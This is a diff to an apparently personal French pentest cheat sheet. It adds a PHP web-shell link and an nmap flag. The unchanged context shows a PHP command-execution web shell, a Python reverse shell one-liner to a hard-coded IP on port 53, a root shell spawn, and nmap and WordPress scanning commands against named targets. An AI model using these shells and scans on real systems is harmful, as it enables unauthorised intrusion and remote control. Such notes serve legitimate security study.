@@ -7,6 +7,7 @@
 - Reverse shell PHP --> [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 	- `<?php system($_GET["cmd"]) ?>`
 
+- [Simple-PHP-Web-Shell](https://github.com/artyuum/simple-php-web-shell)
 - [Reverse shell](https://www.synetis.com/etablir-un-reverse-shell-en-une-ligne/)
 	- `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("81.253.72.139",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
 	- Spawn un shell root --> `python3 -c 'import pty,os; os.setuid(0);os.setgid(0);pty.spawn("/bin/bash")'`
@@ -53,7 +54,7 @@ john zip.hashes`
 
 ### Actif 
 - Voir les ports ouverts --> `nmap -Pn 192.168.1.1`
-- Voir la version des services --> `nmap -sV 192.168.1.1`
+- Voir la version des services --> `nmap -sV -sC 192.168.1.1`
 
 - Wordpress --> `wpcan --url www.mokoil.com`
 
